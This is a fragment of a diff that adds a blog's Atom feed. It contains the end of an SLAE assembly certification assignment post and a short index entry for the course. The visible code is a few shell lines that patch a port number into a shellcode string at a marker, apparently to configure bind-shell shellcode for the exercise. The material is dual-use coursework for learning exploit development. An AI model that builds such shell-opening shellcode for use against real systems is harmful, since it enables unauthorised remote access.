+&lt;span class=&quot;nv&quot;&gt;porthex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;x&lt;span class=&quot;nv&quot;&gt;$lb&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;x&lt;span class=&quot;nv&quot;&gt;$hb&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;marker&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;aa&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;aa&quot;&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[---] Replacing the port to &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$port&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$marker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$porthex&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.&lt;/p&gt;
+
+&lt;p&gt;http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&lt;/p&gt;
+
+&lt;p&gt;Student ID: PA-0726&lt;/p&gt;</content><category term="asm" /><category term="code" /><category term="slae" /><summary>SLAE Assignment #1</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="{&quot;feature&quot;=&gt;&quot;top.jpg&quot;, &quot;credit&quot;=&gt;&quot;SLAE&quot;}" /></entry><entry><title>SLAE</title><link href="/SLAE/" rel="alternate" type="text/html" title="SLAE" /><published>2017-03-20T00:00:00+00:00</published><updated>2017-03-20T00:00:00+00:00</updated><id>/SLAE</id><content type="html" xml:base="/SLAE/">&lt;p&gt;SLAE (short for SecurityTube Linux Assembly Expert) is a online based self phased training in assembly on Linux.&lt;/p&gt;
+
+&lt;p&gt;From the web page: 
+“The SecurityTube Linux Assembly Expert (SLAE) is an online course and certification which focuses on teaching the basics of 32-bit assembly language for the Intel Architecture (IA-32) family of processors on the Linux platform and applying it to Infosec. “&lt;/p&gt;
+
+&lt;p&gt;This page will serve as a index page where all assignments for the course will be placed.&lt;/p&gt;
+
+&lt;p&gt;The course is available at http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/&lt;/p&gt;</content><category term="asm" /><category term="code" /><category term="slae" /><summary>SLAE (short for SecurityTube Linux Assembly Expert) is a online based self phased training in assembly on Linux.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="{&quot;feature&quot;=&gt;&quot;SLAE_logo2.jpg&quot;, &quot;credit&quot;=&gt;&quot;SecurityTube&quot;, &quot;creditlink&quot;=&gt;&quot;http://securitytube-training.com/wp-content/uploads/SLAE_logo2.jpg&quot;}" /></entry></feed>
